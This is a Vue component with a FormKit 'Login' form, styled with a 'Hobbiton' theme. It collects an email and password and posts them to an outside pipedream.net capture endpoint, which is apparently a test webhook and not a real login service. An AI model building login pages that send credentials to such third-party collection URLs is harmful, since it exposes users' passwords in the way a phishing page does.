<template>
<div class = "Hobbiton-theme">
    <FormKit
    type="form"
    submit-label="Login"
    action="https://enpae7aofyxlml7.m.pipedream.net"
    method="post"
  >
    <FormKit
      name="email"
      placeholder="example@gmail.com"
      label="Email address"
      validation="required|email"
    />
    <FormKit
      placeholder="*************"
      type="password"
      name="password"
      label="Password"
      validation="required"
    />
  </FormKit>
       
  
</div>

</template>

<style>
  


</style>
<style>

  


    .formkit-input{
      height: 40px;
    box-shadow: 0px 0px 6px rgba(161, 154, 154, 0.9);
    border-radius: 2.23em;
     }
   

    [data-invalid] .formkit-inner {
      border-color: red;
      box-shadow: 0 0 0 1px red;
 
     
      
    }
    
    [data-complete] .formkit-inner {
      border-color: red;
      box-shadow: 0 0 0 1px green;
     
    }
    [data-complete] .formkit-inner::after {
      content: '✅';
      display: block;
      padding: 0.5em;
     
    }
    </style>